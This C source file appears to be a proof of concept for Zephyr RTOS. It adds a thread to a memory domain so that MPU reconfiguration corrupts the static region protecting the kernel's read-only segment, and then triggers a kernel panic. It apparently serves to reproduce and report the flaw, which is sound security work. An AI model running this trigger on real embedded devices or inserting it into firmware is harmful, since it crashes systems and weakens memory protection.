static void dump_mpu(void)
{
	const uint32_t NUM_REGIONS = _FLD2VAL(MPU_TYPE_DREGION, MPU->TYPE);

	printk("[*] MPU regions dump:\n");
	for (int i = 0; i < NUM_REGIONS; i++) {
		MPU->RNR = i;

		const uint32_t rbar = MPU->RBAR, rlar = MPU->RLAR;
		const uint32_t start = rbar & MPU_RBAR_BASE_Msk;
		const uint32_t end   = (rlar & MPU_RLAR_LIMIT_Msk) | ~MPU_RLAR_LIMIT_Msk;

		if (rlar == 0) {
			//don't dump cleared regions
			continue;
		}

		printk("     Region %2u: RBAR=0x%08x RLAR=0x%08x (range: 0x%08x~0x%08x)\n",
			i, rbar, rlar, start, end);
	}
}

void k_sys_fatal_error_handler(unsigned reason, const struct arch_esf *esf)
{
	printk("\n");
	printk("[+] k_sys_fatal_error_handler(reason=%u)\n", reason);
	dump_mpu();
	printk("[+] Halting kernel...\n");

	k_fatal_halt(reason);
}

static void dummy_thr_fn(void *a1, void *a2, void *a3)
{
	ARG_UNUSED(a1);
	ARG_UNUSED(a2);
	ARG_UNUSED(a3);
	printk("Dummy thread speaking here\n");
	return;
}

K_THREAD_STACK_DEFINE(dummy_thr_stk, 512);
struct k_thread dummy_thread;

int main(void)
{
	int res;
	printk("[*] __rom_region_start=%p\n", (void *)__rom_region_start);
	printk("[*]   __rom_region_end=%p\n", (void *)__rom_region_end);
	printk("[*] victim_array start=%p\n", (void *)victim_array);
	printk("[*]   victim_array end=%p\n", (void *)(victim_array + SIZE - 1));
	dump_mpu();

	struct k_mem_partition va_part = {
		.start = (uintptr_t)victim_array,
		.size = SIZE,
		// I don't think the permissions really matter
		.attr = K_MEM_PARTITION_P_RO_U_RO,
	};

	struct k_mem_domain domain;

	k_mem_domain_init(&domain, 0, NULL);

#ifdef Z_LIBC_PARTITION_EXISTS
	// taken from llext test code, dunno if actually useful...
	k_mem_domain_add_partition(&domain, &z_libc_partition);
#endif

	res = k_mem_domain_add_partition(&domain, &va_part);
	if (res != 0) {
		printk("[-] Failed to add victim partition to domain\n");
		return 0;
	}

	{
		printk("[*] Step 1: corrupt static MPU region for RO segment\n");

		//
		// VERY IMPORTANT: do NOT make this a K_USER thread
		//
		// If this is created as K_USER, it seems the MPU configuration
		// is "applied twice" and the kernel panic we want to trigger
		// occurs directly upon context switch. By making this a kernel
		// thread, the panic will occur only in step 2.
		//

		k_thread_create(&dummy_thread, dummy_thr_stk,
				K_THREAD_STACK_SIZEOF(dummy_thr_stk),
				dummy_thr_fn, NULL, NULL, NULL,
				0, 0, K_FOREVER);

		res = k_mem_domain_add_thread(&domain, &dummy_thread);
		if (res != 0) {
			printk("[-] Failed to add dummy thread to domain\n");
			return 0;
		}

		// let the thread execute
		// this will trigger MPU reconfiguration and corrupt
		// the static MPU region covering RO segment as we want
		k_thread_start(&dummy_thread);
		k_thread_join(&dummy_thread, K_FOREVER);

		printk("[*] Displaying corrupted MPU configuration...\n");
		dump_mpu();
	}

	{
		printk("[*] Step 2: trigger MPU configuration fail\n");

		k_thread_create(&dummy_thread, dummy_thr_stk,
				K_THREAD_STACK_SIZEOF(dummy_thr_stk),
				dummy_thr_fn, NULL, NULL, NULL,
				0, 0, K_FOREVER);

		res = k_mem_domain_add_thread(&domain, &dummy_thread);
		if (res != 0) {
			printk("[-] Failed to add dummy thread to domain\n");
			return 0;
		}

		printk("\n");

		// Let the thread execute.
		// This will trigger MPU reconfiguration which will fail
		// due to the corrupted static MPU region no longer covering
		// the kernel's RO segment, causing a kernel panic due to
		// assertion failure.
		k_thread_start(&dummy_thread);
		k_thread_join(&dummy_thread, K_FOREVER);
	}

	printk("[?] No kernel panic occured - everything is fine?\n");
	printk("[?] Checking MPU configuration...\n");
	dump_mpu();

	return 0;
}
